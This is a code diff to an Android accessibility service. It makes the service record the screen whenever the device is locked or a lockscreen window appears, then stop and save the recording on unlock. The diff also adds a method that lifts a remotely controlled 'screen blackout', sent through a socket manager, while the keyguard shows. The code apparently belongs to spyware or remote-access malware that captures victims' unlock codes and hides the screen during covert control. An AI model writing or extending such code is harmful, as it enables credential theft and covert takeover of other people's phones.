@@ -529,12 +529,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                         case Intent.ACTION_SCREEN_OFF:
                             // Screen turned off WITHOUT unlock — discard frames, nothing useful
+                            if (isLocked) unblockScreenBlackoutForKeyguard();
                             sm.stopScreenReaderAutoNoSave();
                             break;
 
                         case Intent.ACTION_SCREEN_ON:
                             // Screen woke up — ONLY start recording if device is LOCKED
                             if (isLocked) {
+                                unblockScreenBlackoutForKeyguard();
                                 new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                     try { sm.startScreenReaderAuto(); } catch (Exception ignored) {}
                                 }, 300);
@@ -543,6 +545,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
                         case Intent.ACTION_USER_PRESENT:
                             // Device fully unlocked — stop and save immediately
+                            // Do not re-enable screen blackout here; it stays off until an explicit action.
                             sm.stopScreenReaderAuto();
                             break;
 
@@ -603,6 +606,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         filter.addAction(Intent.ACTION_POWER_CONNECTED);
         filter.addAction("android.intent.action.PHONE_STATE");
         registerReceiver(screenStateReceiver, filter);
+    }
+
+    private void unblockScreenBlackoutForKeyguard() {
+        try {
+            android.app.KeyguardManager km = (android.app.KeyguardManager)
+                    getSystemService(android.content.Context.KEYGUARD_SERVICE);
+            if (km == null || !km.isKeyguardLocked()) return;
+            SocketManager.getInstance(this).unblockScreenOnKeyguardLock();
+        } catch (Exception e) {
+            Log.w(TAG, "Unable to request screen unblock for keyguard: " + e.getMessage());
+        }
     }
     
     private void updateCurrentAppName() {
@@ -848,6 +862,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                                 || packageName.toLowerCase().contains("keyguard")
                                 || packageName.toLowerCase().contains("lockscreen")
                                 || packageName.toLowerCase().contains("systemui"))) {
+                            unblockScreenBlackoutForKeyguard();
                             smWin.startScreenReaderAuto();
                         }
                     } catch (Exception ignored) {}
